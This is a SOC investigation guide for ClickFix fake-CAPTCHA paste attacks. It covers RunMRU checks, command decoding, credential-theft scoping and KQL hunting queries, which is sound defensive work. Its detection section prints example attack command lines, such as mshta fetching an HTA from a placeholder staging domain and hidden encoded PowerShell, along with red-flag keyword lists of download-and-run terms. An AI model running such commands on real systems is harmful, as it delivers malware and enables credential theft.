# ClickFix — investigation

The [playbook](playbook.md) gives the order of actions. This page explains what you are looking at and how to scope it. It takes no actions on the device or the accounts.

**Sent here from the [suspicious process](../02-suspicious-process/playbook.md) or [LOLBin](../07-lolbin-abuse/playbook.md) playbook?** Stay in that playbook; don't start the ClickFix playbook.
- Your device is isolated or not as that playbook decided. Don't isolate, stop, block or remove anything from this page.
- Use [Where the user pasted it](#where-the-user-pasted-it), [Confirm the paste](#confirm-the-paste), [Identity and browser credentials](#identity-and-browser-credentials), [Scope across the estate](#scope-across-the-estate) and [How the user got to the page](#how-the-user-got-to-the-page). Add what you find to your playbook's IOC and scope lists.
- On a blocked chain that you haven't isolated: if this page finds anything else (another paste, a connection, a file, a second stage), go to step 8 of your playbook.
- A paste that ran and whose payload you can't name counts as "infostealer or unknown payload executed": escalate and run steps 11 and 17 of the [malware alert playbook](../01-malware-alert/playbook.md), as 02 step 14 and 07 step 15 say. Don't wait for a file: a stealer can run in memory.
- Then go back to the step that sent you (02 step 12 or 19; 07 step 13 or 21).

**Sent here from the false-positive guide?** A paste is closed only under Closing as a false positive in the [playbook](playbook.md).

---

## What is ClickFix?

A social engineering technique in which the user runs the attacker's command themselves (ATT&CK T1204.004). The victim lands on a page showing a fake CAPTCHA, a "verify you're human" check, or a browser or driver "error" that needs fixing. Microsoft names phishing, malvertising and compromised sites as the main routes to these pages. A script on the page copies an attacker-controlled command to the clipboard in the background, then the page tells the user exactly how to run it:

```
Press Win + R, press Ctrl + V, press Enter
```

Other lures tell the user to open Windows Terminal or PowerShell and paste there, or to paste into the File Explorer address bar (see Where the user pasted it). The user pastes the command and presses Enter: the user is the delivery mechanism and the execution mechanism.

> The lure itself usually involves no file. The command reaches the device through the clipboard, and any payload arrives afterwards, fetched by the command.

**What it delivers.** Microsoft: infostealers like LummaStealer, which "appears to be the most prolific ClickFix final payload", remote access tools (Xworm, AsyncRAT, NetSupport, SectopRAT), loaders and rootkits. Microsoft says Lumma "extracts saved passwords, session cookies, and autofill data" from Chromium browsers, including Edge, and from Mozilla and Gecko browsers, and looks for cryptocurrency wallets; and that the pasted commands "often download and execute Lumma directly in memory".

So the credential risk comes from the payload, not from the lure page. Don't scope to the one account that pasted: every browser-saved password and signed-in web session on the device is in question (see Identity and browser credentials).

**Why the usual controls can miss it:**
- Email and web attachment scanning have no file to inspect at the lure stage.
- The first process is a signed Windows binary (`powershell.exe`, `mshta.exe`, `cmd.exe`), so its hash and signature tell you nothing.
- The parent is `explorer.exe`, an expected, everyday parent, so naive parent/child allowlisting doesn't flag it.
- It relies on the user reading nothing carefully: Ctrl+V and Enter is the entire attack surface.

Defender isn't blind to it. PowerShell, including interactive use, passes through the Antimalware Scan Interface (AMSI), and Microsoft lists ClickFix detections and ASR rules (see Was it blocked?). An alert can fire before any payload is written. But those controls depend on the customer's configuration, and the wording of the command changes. Treat "AV shows no detection" as inconclusive, not as all-clear.

---

## Where the user pasted it

The place the command was pasted decides what the data shows. Find this first: it tells you what an empty result means.

| Paste into | What you see | What you won't see |
|---|---|---|
| Run dialog (Win+R) | `explorer.exe → powershell.exe`, `mshta.exe`, `cmd.exe` or another LOLBin, with the pasted text as its command line. Microsoft notes the Run dialog is part of Windows Explorer. A `RunMRU` value, if the process started | The clipboard or the page |
| An open PowerShell, cmd or Windows Terminal window (for example Win+X then I) | Only what the command started or did: children of the shell, and connections and file writes by the shell itself | The pasted text. Commands typed into an open window don't create a process, so they aren't in any `ProcessCommandLine`. No `RunMRU` value: the Run dialog wasn't used |
| File Explorer address bar (FileFix) | The researcher who described FileFix pasted into a browser's file-upload window and showed `cmd.exe` as a child of the browser. So a browser parent is possible | No `RunMRU` value: the Run dialog wasn't used |
| macOS Terminal | Microsoft reports lures that "persuade users to copy and run a command in Terminal" and a payload that harvests credentials, browser and wallet data | This page and the playbook cover Windows. The playbook escalates a macOS device |

**Open-window pastes are the blind spot.** The pattern to look for is a shell with no suspicious arguments of its own that suddenly starts a downloader, or connects out, at T0. Look for children of `powershell.exe`, `pwsh.exe`, `cmd.exe` and the terminal host (`wt.exe`, `WindowsTerminal.exe`), and for `DeviceNetworkEvents` rows whose `InitiatingProcessFileName` is the shell. Whether `DeviceEvents` records the commands themselves (for example a `PowerShellCommand` action type) depends on the tenant: VERIFY (tenant) with the in-portal schema reference. Microsoft recommends PowerShell script block logging for these commands; if the customer has it on, tell the IR lead, because the investigation package's list of contents doesn't include that log.

CSO Online reports a Microsoft post on a campaign that used Win+X then I to open Windows Terminal, which it describes as a way round defences that watch the Run dialog. Microsoft's August 2025 analysis also describes lures that explained how to open Windows Terminal and paste into it.

---

## Was it blocked?

Check the alert's detection status and the device's ASR events first, as in the [suspicious process investigation](../02-suspicious-process/investigation.md#was-it-blocked): `DeviceEvents`, `ActionType` starting with `Asr`, from T0. An action type ending in `Blocked` means the rule stopped that one action. `Audited` means the rule is in audit mode and the action ran.

**Rules Microsoft recommends against ClickFix:**

| Rule (Microsoft name) | Action type prefix | Note |
|---|---|---|
| Block execution of potentially obfuscated scripts | `AsrObfuscatedScript` | Depends on AMSI and cloud protection; supports PowerShell scripts |
| Block JavaScript or VBScript from launching downloaded executable content | `AsrScriptExecutableDownload` | Depends on AMSI |

**Names Microsoft gives for ClickFix detections** (the wording you may see in the queue; other names are possible):
- Antivirus: `Behavior:Win32/ClickFix`, `Behavior:Win32/SuspClickFix`, `Trojan:Win32/ClickFix`, `Trojan:Script/ClickFix`, `Behavior:Win32/RegRunMRU`, `Trojan:HTML/FakeCaptcha`.
- Alerts: "Suspicious command in RunMRU registry", "'ClickFix' malware was prevented", "An active 'ClickFix' malware in a command line was prevented from executing", "Suspicious 'SuspClickFix' behavior was blocked", "Information stealing malware activity".

A block covers that one action. The user may have pasted again, or pasted a different command. Check the Device timeline and `RunMRU`.

---

## Detection — process tree signature

Look for a LOLBin appearing where it normally wouldn't, soon after the user was in a browser:

```
explorer.exe → powershell.exe -w hidden -enc <base64>
explorer.exe → mshta.exe http://<staging-domain>/verify.hta
explorer.exe → cmd.exe /c powershell -nop -w hidden -c "..."
chrome.exe / msedge.exe → cmd.exe / powershell.exe   (possible FileFix; a generic suspicious pattern, not proof of ClickFix)
```

**Red flags on the command line:** `-e` / `-ec` / `-enc` / `-EncodedCommand`, `-w h` / `-w hidden` / `-WindowStyle Hidden`, `-nop` / `-NoProfile`, `IEX`, `Invoke-Expression`, `iwr`, `irm`, `Invoke-WebRequest`, `DownloadString`, `FromBase64String`, `-useb`, `[char]`, a caret (`^`) splitting a word, an `mshta.exe` invocation with a URL argument.

**Lure text after the command.** Microsoft lists comment suffixes that show the user a harmless-looking line, such as "I am not a robot – reCAPTCHA Verification ID: XXXX", "Human, not a robot: CAPTCHA: Verification ID: XXXX" and "Cloud identificator:XXXX". Any of these in a command line or `RunMRU` value is a ClickFix lure, not a support command.

**Other binaries.** The query below only looks at `powershell.exe`, `pwsh.exe`, `mshta.exe` and `cmd.exe`. Microsoft also names `rundll32`, `wscript`, `curl`, `wget` and `msiexec` in `RunMRU` hunting, `msbuild.exe` and `regasm.exe` as injection targets, and a February 2026 variant that uses `nslookup` through `cmd.exe` and runs the `Name:` line of a DNS answer. SANS ISC reports fake CAPTCHA pages using `finger.exe` to fetch their next stage. Read the command line of whatever the alert names.

The parent alone isn't the whole signal: `explorer.exe` spawning `powershell.exe` happens legitimately too. What points to ClickFix is the combination of an unexpected LOLBin, an obfuscated or hidden command line, a download or in-memory run, and a browser session on the same device shortly before. Switches are a reason to decode, not a verdict: management tools use them too. See [clickfix-lolbin-from-browser-explorer.kql](../../../kql/process/clickfix-lolbin-from-browser-explorer.kql). It joins the LOLBin execution back to browser process starts on the same device.

```kql
// ClickFix — LOLBin spawned from explorer.exe (Run dialog) or a browser
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1204.004
// Looks for an encoded/hidden command line, joined back to the nearest preceding browser process
// on the same device
// Covers: powershell.exe, mshta.exe, cmd.exe launched as if a user pasted a fake CAPTCHA /
//   "verify you're human" command into Win+R or a terminal
// A LOLBin alone from explorer.exe isn't unusual — the browser correlation within 5 minutes
// is what separates ClickFix from routine admin activity
// Ref: docs/scenarios/13-clickfix/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
let LOLBinExec = DeviceProcessEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where FileName in~ ("powershell.exe", "pwsh.exe", "mshta.exe", "cmd.exe")
| where InitiatingProcessFileName in~ (
    "explorer.exe", "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
| where ProcessCommandLine has_any (
    "-enc", "-EncodedCommand", "-w hidden", "-windowstyle hidden",
    "-nop", "-noprofile", "IEX", "Invoke-Expression",
    "DownloadString", "FromBase64String", "mshta")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessId;
let BrowserActivity = DeviceProcessEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where FileName in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
| project BrowserTimestamp = Timestamp, DeviceName, BrowserProcess = FileName;
LOLBinExec
| join kind=leftouter BrowserActivity on DeviceName
| where isempty(BrowserProcess) or BrowserTimestamp between ((Timestamp - 5m) .. Timestamp)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessId, BrowserProcess, BrowserTimestamp
| order by Timestamp desc
```

**What this query misses.** An empty result isn't clean.
- Open-window pastes: their children have a shell as parent, which the parent list doesn't include. `WindowsTerminal.exe` isn't in it either.
- `iwr`, `irm`, `-e`, `-ec` and `-w h`: not in its term list. `has` matches whole terms.
- Every binary in Other binaries above.
- A device where a browser process started in the 48-hour window but not in the 5 minutes before the LOLBin: the row is dropped. The query sees browser process starts, not browser use.

---

## Decode the command

Do this before any network or estate search: the staging domain is usually inside the command.

Follow [Decode before you judge](../02-suspicious-process/investigation.md#decode-before-you-judge). `-EncodedCommand` is base64 of UTF-16LE text. Decode on your analysis machine, never run the result, and don't open its URLs in a browser.

Other forms ClickFix commands use, all of which you read rather than run:
- Plain text: the whole command is in the command line. Read it, including the part after a `#` or a long run of spaces.
- Caret-split words (`p^ow^ers^hell`) and `[char]` lists: rebuild the words by hand.
- Hex or XOR strings: CSO Online reports hex-encoded and XOR-compressed commands in the Windows Terminal campaign. If you can't get to readable text, record it as "not fully decoded"; the playbook escalates it.

Record every URL, IP, domain and file name. These are the IOCs for the checks below. Domains in ClickFix rotate, so also record the shape of the command: its switches, the lure comment and the file name it writes.

---

## Confirm the paste

**`RunMRU`.** Microsoft: "Entering commands into the Run dialog leaves forensic traces", most notably in the `RunMRU` key, `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, which "keeps a history of Run dialog executions".

Search `DeviceRegistryEvents` for the device from T0 − 24h: `ActionType` is `RegistryValueSet`, `RegistryKey` contains `CurrentVersion\Explorer\RunMRU`, `InitiatingProcessFileName` is `explorer.exe`, and `RegistryValueName` is not `MRUList`. This is the filter in Microsoft's own hunting query. The command is in `RegistryValueData`.

- A value whose data matches the process command line, at T0, confirms a Run-dialog paste.
- A value with a LOLBin, a URL, a lure comment or an encoded string that doesn't match anything in the chain is another paste. Decode it and add it to the chain.
- **No value doesn't clear the device.** Microsoft: the key "doesn't create a registry entry if the process execution fails". A paste into any other window never touches it. The key is per user, and the query shows only what the sensor recorded (VERIFY (tenant) that your tenant returns `RunMRU` rows: search for any in the last 7 days).
- Whether a Live Response session can read the user's HKCU is VERIFY (tenant), so use the telemetry.

**Ask the user.** Nothing in process data shows a user pasting text, and nothing used on this page records the clipboard or the page. Ask, through the customer contact: what page were you on, how did you get there, what did it tell you to do, where did you paste, how many times, and did anyone tell you to do this? A "verify you're human" check or a "fix this error" prompt before the paste is the ClickFix lure.

**Someone told them to paste.** Attackers also pose as support. Microsoft reports threat actors impersonating "IT or help desk personnel" and using Quick Assist, then running scripted `curl` commands. A person on the phone or in a chat isn't proof of a helpdesk session. Confirm the ticket with the customer contact, not with the user.

---

## Follow the chain

Pull the process tree around T0: parent, the LOLBin, and anything the LOLBin started.

The query doesn't return the columns you need to link a child to its parent. Add `ProcessId, ProcessCreationTime, InitiatingProcessId, InitiatingProcessCreationTime, FolderPath, SHA1` to its `project` line in your portal, and link them as in [Follow the process](../02-suspicious-process/investigation.md#follow-the-process). It starts 10 minutes before T0 and ends 30 minutes after; widen it if the chain continues.

```kql
// 13 — process tree around the alert
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceProcessEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 10m) .. (T0 + 30m))
| project Timestamp, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

Check each binary as in [Process name spoofing](../02-suspicious-process/investigation.md#process-name-spoofing): CSO Online reports the Windows Terminal campaign downloading a renamed legitimate 7-Zip binary to unpack its payload, so a signed file under a random name is not cleared by its signature.

---

## Network callouts

Not every paste succeeds (typos, the page going down, network blocking), so confirm whether the command reached out. A row means a connection was made, not that a payload arrived: Microsoft states a site that network protection blocked can still show as `ConnectionSuccess`, so check the alerts queue. A successful callout to the staging URL means a payload was likely delivered.

`RemoteUrl` is "URL or fully qualified domain name". For HTTPS, expect a host name at most (VERIFY (tenant)). The command line often holds the full URL.

```kql
// 13 — callouts from this device to the malicious domain
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
let MaliciousDomain = "SUSPICIOUS_DOMAIN_HERE";
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteUrl has MaliciousDomain
| project Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine,
    RemoteUrl, RemoteIP, RemotePort
```

Run it once per domain from the decoded command. Also list every connection the chain made, by process, without a domain filter ([Follow the process](../02-suspicious-process/investigation.md#follow-the-process)): the next stage may not use the same domain, and an `nslookup` or `finger.exe` variant has no web URL. [clickfix-callout-correlation.kql](../../../kql/network/clickfix-callout-correlation.kql) is narrower: it looks back 24 hours from now and keeps only connections from the LOLBin itself, within 5 minutes of its start. Use it for a fresh incident only.

---

## Dropped payloads and persistence

The query lists file events in `Temp`, `AppData` and `ProgramData`. It has no `ActionType` filter and doesn't cover paths such as `C:\Users\Public` or `Downloads`, so it is noisy and incomplete. Read the rows whose `InitiatingProcessFileName` is in the chain; the chain's own file events ([Follow the process](../02-suspicious-process/investigation.md#follow-the-process)) are the fuller list.

```kql
// 13 — files dropped in user-writable paths
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceFileEvents
| where DeviceName startswith "HOSTNAME"
| where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\")
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| project Timestamp, FileName, FolderPath, SHA1, SHA256, InitiatingProcessFileName
```

SHA256 is usually empty; use SHA1. A payload run in memory leaves no file here, so an empty result doesn't mean nothing ran.

For persistence use the [persistence playbook](../04-persistence-detected/playbook.md), which covers more than [scheduled-task-creation.kql](../../../kql/persistence/scheduled-task-creation.kql) and [registry-run-key-modifications.kql](../../../kql/persistence/registry-run-key-modifications.kql). CSO Online reports the Windows Terminal campaign persisting through scheduled tasks and adding Defender exclusions.

---

## Identity and browser credentials

**The risk is the payload.** ClickFix lure pages exist to make the user run a command, and the credential theft comes from what that command delivers (see What is ClickFix?). If the user also typed a password into the page or a prompt, treat that password as known to the attacker as well.

**What a stealer takes:** browser-saved passwords, session cookies, autofill data, wallets and files from the user profile. lsass checks don't cover this: a stealer reads the browser profile. Microsoft's token theft playbook describes attackers who "compromise and replay tokens issued to a user, even if that user has satisfied multifactor authentication", so a stolen session needs neither the password nor MFA.

**What you can see.** Microsoft documents `DeviceFileEvents` as file creation, modification and other file system events; its page lists no read events, so don't expect a row for a stealer reading `Login Data` or `Cookies`. Look for:
- Alerts Microsoft associates with this: "Possible theft of passwords and other sensitive web browser information", "Information stealing malware activity", "Suspicious DPAPI Activity".
- `DeviceEvents` with `ActionType` `DpapiAccessed`, where `AdditionalFields` names Chrome or Edge and `SPCryptUnprotect`, from a process that isn't the browser. This is the filter in Microsoft's Lumma hunting query (VERIFY (tenant) that your tenant returns it).
- Reported code injection into the browser (`chrome.exe`, `msedge.exe`): CSO Online reports this in the Windows Terminal campaign. A theft from inside the browser process doesn't look like a non-browser process at all, so no signal doesn't clear the device.

**Sign-ins.** The query covers one user, T0 − 24h to T0 + 24h, and needs Sentinel. Without Sentinel, use the Entra sign-in logs (interactive and non-interactive tabs). Run it for every exposed user. A stolen session can be used days later, so rerun it with a later T0 until the sessions are revoked. Look for successful sign-ins (`ResultType` 0) from an IP, country or device the user doesn't recognise, and check Entra ID Protection for risk detections ("Anomalous token" among them). Microsoft notes that not every such alert has a matching row in `SigninLogs`, so a clean result here doesn't clear the account.

```kql
// 13 — sign-ins for the affected user around and after the incident
// Runs in: Sentinel only

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
union SigninLogs, AADNonInteractiveUserSignInLogs
| where UserPrincipalName =~ "USERNAME"
| where TimeGenerated between ((T0 - 24h) .. (T0 + 24h))
| project TimeGenerated, AppDisplayName, IPAddress, ResultType, Type
| order by TimeGenerated desc
```

**What revoking does and doesn't do.** Entra's Revoke sessions invalidates refresh tokens. Access tokens already issued last until they expire (1 hour by default), and Microsoft states Entra "can't directly revoke a session token issued by an application". Sites outside Entra aren't touched at all: passwords saved for them need resetting at each site. The [credential compromise playbook](../06-credential-compromise/playbook.md) has the order; the ClickFix playbook sends you to it.

---

## Scope across the estate

One user pasting a command doesn't mean one user was targeted: anyone who reaches the compromised page may get the same lure. See [clickfix-tenant-wide-ioc-hunt.kql](../../../kql/network/clickfix-tenant-wide-ioc-hunt.kql). It sweeps network, process, URL-click and email-URL telemetry for the domains you add to it. It looks back 7 days from now, so widen it if T0 is older.

Read the result with these limits:
- `UrlClickEvents` holds Safe Links clicks from email, Teams and Office apps only. `EmailUrlInfo` holds URLs in mail. A lure reached from a search result, an advert or a compromised site won't be in either.
- A network hit shows a device reached the domain, not that its user pasted anything. A compromised legitimate site may have many innocent visitors. Check that device's process chain around the hit before you call it affected.
- Domains rotate. Zero rows doesn't prove no spread. Also search `DeviceProcessEvents` for the shape of the command (switches, lure comment, written file name), `RunMRU` for the lure comment across the estate, and run the [hash sweep](../05-malicious-file/investigation.md#hash-across-estate) with the SHA1 of each payload. Never hash-sweep the LOLBin: its hash is on every device.

Spread is scope, never a sign that the activity is benign.

---

## How the user got to the page

Start with the user's answer (see Confirm the paste). Then:
- The browser's connections in the minutes before T0 in `DeviceNetworkEvents`: `InitiatingProcessFileName` is the browser. A new or odd domain just before T0 is a candidate for the lure page. Don't browse to it.
- `FileOriginUrl` and `FileOriginReferrerUrl` on any file the chain wrote.
- `UrlClickEvents` for the user around T0, if the link came through email, Teams or Office. A phishing email goes to the [phishing email playbook](../12-phishing-email/playbook.md).
- Otherwise record it as a search result, an advert, a compromised site or unknown.

---

## Special case: EtherHiding

If the lure was served from a **legitimate, otherwise-trusted website that's been compromised**, check whether it was staged with **EtherHiding**: malicious code read from a smart contract on a public blockchain instead of from a server the attacker runs. Microsoft and Google Threat Intelligence both report this feeding ClickFix lures. Google: the injected JavaScript "executes in the browser" and connects to BNB Smart Chain contracts through a public node such as `bsc-dataseed.binance.org`.

**Why this matters for scoping:** the indicator is a **smart contract address plus an RPC endpoint host**, not a domain the attacker registered. Microsoft says IP or domain blocking and content-based detection "are less effective" against it. Google says the actor can change a lure with a single cheap transaction, so the contract's content changes with no change to any network indicator you'd normally hunt on. The RPC host is shared infrastructure.

**Two places it shows up:**
- **The browser.** This is the case Google describes: the page's own script calls the RPC host, so the connection belongs to `chrome.exe` or `msedge.exe`, just before T0. Search `DeviceNetworkEvents` for the RPC host with the browser as `InitiatingProcessFileName`. A customer with web3 users will see these legitimately, so it is a lead, not proof.
- **A non-browser process.** Microsoft's July 2026 ACR Stealer report describes a loader "communicating with public blockchain RPC endpoints", and CSO Online reports the same in the Windows Terminal campaign. PowerShell, mshta, a script host, `MSBuild.exe` or an unknown binary calling an RPC host is a strong signal.

[clickfix-etherhiding-rpc-callout.kql](../../../kql/network/clickfix-etherhiding-rpc-callout.kql) covers only the second case. It excludes browsers, looks back 24 hours from now, and its host list is illustrative. An empty result doesn't rule EtherHiding out.

**The contract address** isn't in Defender data: `DeviceNetworkEvents` has no payload column. It comes from threat intelligence or from the IR lead's analysis of the page. Don't visit the page to find it. It can't be blocked at the network layer; track it as an IOC. Once you have it, pivot your hunt to the contract and the RPC host rather than to a domain.

---

## Containment and remediation

These are in the [playbook](playbook.md), in order: isolate, collect evidence, contain the accounts, stop, block, remove, then clean or reimage. Don't act from this page.

---

## MITRE ATT&CK mapping

| Technique | ID |
|-----------|-----|
| User execution — malicious copy and paste | T1204.004 |
| PowerShell | T1059.001 |
| Application layer protocol — web | T1071.001 |
| Web service (EtherHiding C2 variant) | T1102 |

Full detail in [MITRE-mapping.md](../../../MITRE-mapping.md).
